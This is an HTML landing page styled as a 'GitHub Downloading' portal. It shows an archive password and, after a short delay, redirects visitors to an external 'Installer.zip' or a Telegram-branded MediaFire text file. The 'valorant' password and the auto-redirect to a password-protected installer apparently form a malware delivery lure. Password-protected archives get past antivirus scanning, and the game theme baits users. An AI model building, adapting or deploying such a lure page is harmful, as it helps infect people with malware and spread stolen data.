<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Downloading</title>
    <style>
        body {
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #e0bbff, #a29bce);
            font-family: Arial, sans-serif;
            color: #4b0082;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.85);
            padding: 50px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
            border: 2px solid #9370db;
            max-width: 420px;
        }
        .password-box {
            margin: 25px 0;
            padding: 18px;
            background: #f8f5ff;
            border: 2px dashed #9370db;
            border-radius: 12px;
            font-size: 22px;
            font-weight: bold;
            color: #4b0082;
            user-select: all;
        }
        .filename-info {
            font-size: 17px;
            margin: 15px 0;
            color: #555;
        }
        .note {
            font-size: 15px;
            color: #666;
            margin-top: 30px;
        }
        .error {
            color: #d32f2f;
            font-weight: bold;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="container" id="main">

        <div class="filename-info" id="info">Loading...</div>
        <div class="password-box" id="password">â€”</div>
        <div class="note">PASSWORD FOR UN-ZIP ARCHIVE!</div>

    </div>

<script>
    const fileMap = {
        "1":          "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
        "installer":  "https://github.com/charter-fairyu10/turn/releases/download/ex/Installer.zip",
        "premium-txt": "https://www.mediafire.com/file/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%40TXT_ALIENS_-_1444.txt/file",
        "txt-aliens": "https://www.mediafire.com/file/7grjnw3i1n1x71a/FOLLOW_TELEGRAM_%40TXT_ALIENS_-_1444.txt/file"
    };

    const passwordMap = {
        "1":          "valorant",
        "installer":  "password",
        "premium-txt": "txtaliens1444",
        "txt-aliens": "txtaliens1444",
        // "name":   "password",
    };

    const params = new URLSearchParams(window.location.search);
    const filename = params.get("filename");

    if (!filename || !fileMap[filename]) {
        document.getElementById("main").innerHTML = `
            <div class="error">
                <h2>Access Error..</h2>
                <p>Update filename</p>
               
            </div>`;
        throw new Error("stop"); 
    }

    const realUrl   = fileMap[filename];
    const password  = passwordMap[filename] || "password empty";

    document.getElementById("info").textContent     = `Your file from GitStorage: ${filename}`;
    document.getElementById("password").textContent = password;

    setTimeout(() => {
        window.location.href = realUrl;
    }, 700);
</script>
</body>
</html>
